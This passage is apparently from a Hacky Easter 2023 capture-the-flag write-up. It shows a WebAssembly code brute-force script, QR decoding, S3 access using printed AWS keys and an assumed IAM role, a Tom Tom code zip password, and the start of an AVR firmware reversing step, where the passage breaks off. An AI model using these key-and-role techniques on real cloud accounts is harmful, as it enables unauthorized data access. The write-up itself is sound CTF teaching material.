    <span class="nx">msg</span><span class="o">=</span><span class="nf">checkWASM</span><span class="p">(</span><span class="nx">i</span><span class="p">.</span><span class="nf">toString</span><span class="p">());</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">he2023</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">code</span><span class="o">+</span><span class="dl">"</span><span class="s2">: </span><span class="dl">"</span><span class="o">+</span><span class="nx">msg</span><span class="p">);</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nf">ready</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="p">(</span><span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">check.wasm</span><span class="dl">"</span><span class="p">);</span>
        <span class="kd">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">response</span><span class="p">.</span><span class="nf">arrayBuffer</span><span class="p">();</span>
        <span class="kd">const</span> <span class="nx">wasm</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nf">instantiate</span><span class="p">(</span><span class="nx">file</span><span class="p">);</span>
        <span class="kd">const</span> <span class="p">{</span><span class="nx">memory</span><span class="p">,</span> <span class="nx">check</span><span class="p">}</span> <span class="o">=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">;</span>
        <span class="nx">wasmMemory</span> <span class="o">=</span> <span class="nx">memory</span><span class="p">;</span>
        <span class="nx">wasmCheck</span> <span class="o">=</span> <span class="nx">check</span><span class="p">;</span>

        <span class="c1">//bruteforce the code</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">bruteforcing</span><span class="dl">"</span><span class="p">);</span>
        <span class="nf">bruteforce</span><span class="p">();</span>
    <span class="p">})();</span>

<span class="p">})</span>

</pre></table></code></div></div><p>and keep an eye on our console, and after about 10 seconds we get our flag!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>main.js:99 bruteforcing
main.js:32 searching..
main.js:35 chacking codes starting with 0
main.js:35 chacking codes starting with 1
main.js:35 chacking codes starting with 2
main.js:46 29660145: he2023{w3b4553m81y_15_FUN}
</pre></table></code></div></div><p><img src="writeupfiles/codelocked-chrome.png" alt="" /></p><p>whoo!</p><h2> Flag</h2><code> he2023{w3b4553m81y_15_FUN} </code><hr><h1 id="quilt"> Quilt <a href="/writeups/HackyEaster_2023/level6-3-quilt.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A warm, sunny day - perfect weather for a picnic! But what’s that - did the bunnies really bring the nice quilt from the living room as a blanket?</p><p><img src="writeupfiles/quilt.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>First, split the quilt up into individual QR codes:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">convert quilt.png -crop 69x69 +repage +adjoin 'quilt-%03d.png'
</span></pre></table></code></div></div><p>Let’s read them all, it can’t be this easy right?</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">for i in quilt-*;</span><span class="w"> </span><span class="k">do </span>zbarimg <span class="nv">$i</span> 2&gt;/dev/null| <span class="nb">grep </span>QR-Code | <span class="nb">sed</span> <span class="s1">'s/QR-Code://g'</span> <span class="o">&gt;&gt;</span> quilt.txt<span class="p">;</span> <span class="k">done</span>
</pre></table></code></div></div><p>But maybe it is?</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">cat quilt.txt | tr -d '\n'
</span></pre></table></code></div></div><p>which results in:</p><blockquote><p>Hello! Do you love quilts? Well… I am pretty sure I do! They are so pretty.. my oh my, but look at me getting lost in idle thoughts! You are here for an egg, right? I bet you are. Where did I put it? Ah, here he2023{this_is_th… No, sorry, that is not it. That was an old one, can you believe it? This maybe? he2023{I_need_this_egg_for_breakfast}. Nooo.. sorry! But I am fairly sure this is it, right here he2023{Qu1lt1ng_is_quit3_relaxing!} Yeah, that should be it. Sorry. I am rambling, but it is so nice to have a visitor appreciating my quilts! They are a lot of work, and I love all of them. Please, do not leave so soon. How about a cookie? Would you like a cookie? Hey, where are you going?</p></blockquote><p>And the third one is it.</p><h2> Flag</h2><code> he2023{Qu1lt1ng_is_quit3_relaxing!} </code><hr><h1 id="cats-in-the-bucket"> Cats in the Bucket <a href="/writeups/HackyEaster_2023/level6-4-cats-in-the-bucket.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There is a bucket full of cat images. One of them contains a flag. Go get it!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Bucket: cats-in-a-bucket
Access Key ID: AKIATZ2X44NMCEQW46PL
Secret Access Key: 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
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We got a bucket name, so try a region:</p><p>When we visit <a href="http://cats-in-a-bucket.s3-website-eu-west-1.amazonaws.com/">http://cats-in-a-bucket.s3-website-eu-west-1.amazonaws.com/</a> we get the message</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>400 Bad Request

- Code: IncorrectEndpoint
- Message: The specified bucket exists in another region. Please direct requests to the specified endpoint.
- Endpoint: cats-in-a-bucket.s3-website.eu-central-1.amazonaws.com
- RequestId: FB490WD7T4HGKGVW
- HostId: 6O/1HC9Rkpbz7CTt0N9LdLU8HBDG4r+soXelEScHgHp+opFS5f+hrlJEFUEJdDlTJwu8gLhCK9U=

</pre></table></code></div></div><p>ok so we go to <a href="cats-in-a-bucket.s3-website.eu-central-1.amazonaws.com">cats-in-a-bucket.s3-website.eu-central-1.amazonaws.com</a>, and here we see</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>404 Not Found

- Code: NoSuchWebsiteConfiguration
- Message: The specified bucket does not have a website configuration
- BucketName: cats-in-a-bucket
- RequestId: PM3VWVHPJF5P9JKR
- HostId: jOkYruD+efHf1nGXz/NehA/fVQxgqYrbm8c+Ia/4nl+fAnhO8ldZK40Z6WJM/1BYRL/RU8ymw58=
</pre></table></code></div></div><p>so there is no website, but we got the right bucket, now what? We have the access keys</p><p>we use awscli for further exploration:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$ aws s3 ls s3://cats-in-a-bucket

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
</pre></table></code></div></div><p>ok, let’s set up our credentials</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span>aws configure
AWS Access Key ID <span class="o">[</span><span class="k">****************</span>UWDA]: AKIATZ2X44NMCEQW46PL
AWS Secret Access Key <span class="o">[</span><span class="k">****************</span>8Kup]: TZ0G7JPxpW0NXymKNy+qbkERJ9NF+mQrxESCoWND
Default region name <span class="o">[</span>us-east-1]: eu-central-1
Default output format <span class="o">[</span>None]:
</pre></table></code></div></div><p>and try again:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://cats-in-a-bucket
2022-10-09 17:23:46      83709 cat1.jpg
2022-10-09 17:23:48      92350 cat2.jpg
2022-10-09 17:23:47     119214 cat3.jpg
2022-10-09 17:23:47      87112 cat4.jpg

</pre></table></code></div></div><p>ok, let’s download those files:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>aws s3 <span class="nb">cp </span>s3://cats-in-a-bucket/cat1.jpg <span class="nb">.</span>
download: s3://cats-in-a-bucket/cat1.jpg to ./cat1.jpg
<span class="nv">$ </span>aws s3 <span class="nb">cp </span>s3://cats-in-a-bucket/cat2.jpg <span class="nb">.</span>
download: s3://cats-in-a-bucket/cat2.jpg to ./cat2.jpg
<span class="nv">$ </span>aws s3 <span class="nb">cp </span>s3://cats-in-a-bucket/cat3.jpg <span class="nb">.</span>
download: s3://cats-in-a-bucket/cat3.jpg to ./cat3.jpg
<span class="nv">$ </span>aws s3 <span class="nb">cp </span>s3://cats-in-a-bucket/cat4.jpg <span class="nb">.</span>
fatal error: An error occurred <span class="o">(</span>403<span class="o">)</span> when calling the HeadObject operation: Forbidden
</pre></table></code></div></div><p>We get 3 very cute cat pictures</p><p><img src="writeupfiles/cat1.jpg" alt="" /> <img src="writeupfiles/cat2.jpg" alt="" /> <img src="writeupfiles/cat3.jpg" alt="" /></p><p>but an error on the fourth image, hmm..</p><p>maybe an older version didnt have the restriction?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$ aws s3api list-object-versions --bucket cats-in-a-bucket

An error occurred (AccessDenied) when calling the ListObjectVersions operation: Access Denied
</pre></table></code></div></div><p>ok, let’s look at the policies that are set</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ aws s3api get-bucket-policy --bucket cats-in-a-bucket
</pre></table></code></div></div><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="s2">"s3:ListBucket"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"s3:GetBucketPolicy"</span><span class="w">
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::261640479576:user/misterbuttons"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:s3:::cats-in-a-bucket"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"s3:GetObject"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::261640479576:user/misterbuttons"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="s2">"arn:aws:s3:::cats-in-a-bucket/cat1.jpg"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"arn:aws:s3:::cats-in-a-bucket/cat2.jpg"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"arn:aws:s3:::cats-in-a-bucket/cat3.jpg"</span><span class="w">
      </span><span class="p">]</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"s3:ListBucket"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::261640479576:role/captainclaw"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:s3:::cats-in-a-bucket"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"s3:GetObject"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::261640479576:role/captainclaw"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:s3:::cats-in-a-bucket/cat4.jpg"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2008-10-17"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>ok, so <code class="language-plaintext highlighter-rouge">cat4.jpg</code> is only accessible for the <code class="language-plaintext highlighter-rouge">captainclaw</code> role. Let’s set that up:</p><p>in <code class="language-plaintext highlighter-rouge">~/.aws/config</code> we set:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>[default]
region = eu-central-1

[profile cat]
role_arn = arn:aws:iam::261640479576:role/captainclaw
source_profile = default
</pre></table></code></div></div><p>and try downloading again:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ aws s3 cp --profile cat s3://cats-in-a-bucket/cat4.jpg .
download: s3://cats-in-a-bucket/cat4.jpg to ./cat4.jpg
</pre></table></code></div></div><p>whoo, success!</p><p><img src="writeupfiles/cat4.jpg" alt="" /></p><h2> Flag</h2><code> he2023{r013_assum3d_succ3ssfuLLy} </code><hr><h1 id="tom-s-diary"> Tom's Diary <a href="/writeups/HackyEaster_2023/level6-5-toms-diary.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Tom found a flag and wrote something about it in his diary.</p><p>Can you get the flag?</p><p><a href="writeupfiles/diary.txt">diary.txt</a></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>// // // // // // // // // // // // // // // // // // // // // //
// // // // // // // // // // // // // // // // // // // // // //

Tom's Diary

\/\ \\\/ / \/\ /\\ /\ \/\ //\ /\/ /\// //\/ /\// /\/ //\ /\\\ \\/\
\/\ \\\/ / \/\ /\\ /\ \/\ //\ /\/ /\// //\/ /\// /\/ //\ /\\\ \\/\

Dear diary,

today I found a secret flag.

I need to keep it safe here:

UEsDBAoACQAAAJJEK1X6oNHsKgAAAB4AAAAIABwAZmxhZy50eHRVVAkAA/OBHWOR
gR1jdXgLAAEE9QEAAAQUAAAArGnVXoZRCLYaWU8HFSFo+dWfh2yfPa868sNqxTVP
xqHrGTs3dIVbxR9WUEsHCPqg0ewqAAAAHgAAAFBLAQIeAwoACQAAAJJEK1X6oNHs
KgAAAB4AAAAIABgAAAAAAAEAAACkgQAAAABmbGFnLnR4dFVUBQAD84EdY3V4CwAB
BPUBAAAEFAAAAFBLBQYAAAAAAQABAE4AAAB8AAAAAAA=

\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\
\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\
</pre></table></code></div></div><p><strong>Hint:</strong> Neither brute force nor word lists are necessary.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s see what is in this base64 string:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"UEsDBAoACQAAAJJEK1X6oNHsKgAAAB4AAAAIABwAZmxhZy50eHRVVAkAA/OBHWORgR1jdXgLAAEE9QEAAAQUAAAArGnVXoZRCLYaWU8HFSFo+dWfh2yfPa868sNqxTVPxqHrGTs3dIVbxR9WUEsHCPqg0ewqAAAAHgAAAFBLAQIeAwoACQAAAJJEK1X6oNHsKgAAAB4AAAAIABgAAAAAAAEAAACkgQAAAABmbGFnLnR4dFVUBQAD84EdY3V4CwABBPUBAAAEFAAAAFBLBQYAAAAAAQABAE4AAAB8AAAAAAA="</span> | <span class="nb">base64</span> <span class="nt">-d</span>

PK
        D+Uflag.txtUT   ccux
                            i^YO!h՟l<span class="o">=</span>:j5Oơ<span class="p">;</span>7t[VP<span class="k">*</span>PK
        D+Uflag.txtUTcux
</pre></table></code></div></div><p>That looks like a zip file, let’s output it to a file</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ echo "UEsDBAoACQAAAJJEK1X6oNHsKgAAAB4AAAAIABwAZmxhZy50eHRVVAkAA/OBHWORgR1jdXgLAAEE9QEAAAQUAAAArGnVXoZRCLYaWU8HFSFo+dWfh2yfPa868sNqxTVPxqHrGTs3dIVbxR9WUEsHCPqg0ewqAAAAHgAAAFBLAQIeAwoACQAAAJJEK1X6oNHsKgAAAB4AAAAIABgAAAAAAAEAAACkgQAAAABmbGFnLnR4dFVUBQAD84EdY3V4CwABBPUBAAAEFAAAAFBLBQYAAAAAAQABAE4AAAB8AAAAAAA=" | base64 -d &gt; diary.zip
</pre></table></code></div></div><p>let’s try to unzip it:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>unzip diary.zip
Archive:  diary.zip
<span class="o">[</span>diary.zip] flag.txt password:
</pre></table></code></div></div><p>ok it needs a password, hmm..</p><p>the hint tells us we don’t need brute force or a wordlist, so we must be able to find the password somewhere.</p><p>We google the line of slashes that’s in the diary file</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>\/\ \\\/ / \/\ /\\ /\ \/\ //\ /\/ /\// //\/ /\// /\/ //\ /\\\ \\/\
</pre></table></code></div></div><p>And find that this could be <a href="https://www.dcode.fr/tom-tom-code">Tom Tom Code</a>, well that certainly fits with the challenge title. We decode it on <a href="https://www.dcode.fr/tom-tom-code">dcode.fr</a> and find it translates to</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>slashesforprofit
</pre></table></code></div></div><p>We enter this as the password for the zip file and get our flag!</p><h2> Flag</h2><code> he2023{sl4sh3s_m4k3_m3_h4ppy} </code><hr><h1 id="custom-keyboard"> Custom Keyboard <a href="/writeups/HackyEaster_2023/level7-1-custom-keyboard.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Thumper built his first custom keyboard. He chose all the parts separately and in the end even adjusted the firmware.</p><p>Apparently, there’s a flag hidden inside it. Can you find it?</p><p><a href="writeupfiles/custom_keyboard.elf">custom_keyboard.elf</a></p><p>🚩 Flag</p><ul><li>lowercase and _ only<li>example: <code class="language-plaintext highlighter-rouge">he2023{example_flag_only}</code></ul><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file custom_keyboard.elf
custom_keyboard.elf: ELF 32-bit LSB executable, Atmel AVR 8-bit, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, with debug_info, not stripped
</pre></table></code></div></div><p>is we run <code class="language-plaintext highlighter-rouge">strings</code> on the file, we find the string <code class="language-plaintext highlighter-rouge">/home/hacker/qmk_firmware</code> ..</p><p>so we suspect this is <a href="https://docs.qmk.fm/#/">Quantum Mechanical Keyboard firmware</a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$ </span>objdump <span class="nt">-dS</span> custom_keyboard.elf

custom_keyboard.elf:     file format elf32-little

objdump: can<span class="s1">'t disassemble for architecture UNKNOWN!

</span></pre></table></code></div></div><p>So we find a useful Docker container containing binutils and gdb for various architectures (<a href="https://hub.docker.com/r/blukat29/cross/">here</a>)</p><p>and inside this docker we can run commands like objdump for our file, and find:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>avr-elf-objdump custom_keyboard.elf <span class="nt">-dS</span> <span class="nt">--section</span><span class="o">=</span>.data

<span class="o">[</span>..]
00800216 &lt;flag_leds.8&gt;:
  800216:       22 18 0b 03 0b 0a 10 1f 18 25 26 02 1f 13 23 22     <span class="s2">"........%&amp;...#"</span>
  800226:       16 02 16 22 18 02 19 27 15 0f                       ...<span class="s2">"...'..
[..]
</span></pre></table></code></div></div><p>which looks kindof suspicious .. are these codes for keys on the keyboard?</p><p>.. this definitely fits with being the flag, <code class="language-plaintext highlighter-rouge">22 18 0b 03 0b 0a</code> would be <code class="language-plaintext highlighter-rouge">he2023</code>, and the <code class="language-plaintext highlighter-rouge">2</code>s are the same code, <code class="language-plaintext highlighter-rouge">3</code> is one differnce with <code class="language-plaintext highlighter-rouge">2</code>, etc (interestingly 3 is lower code than 2, the difference between our supposed <code class="language-plaintext highlighter-rouge">h</code> and <code class="language-plaintext highlighter-rouge">e</code> is not their difference in ASCII but, still this seems like the flag, just need to figure out the encoding</p><p>so the theory is that the flag is something like:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
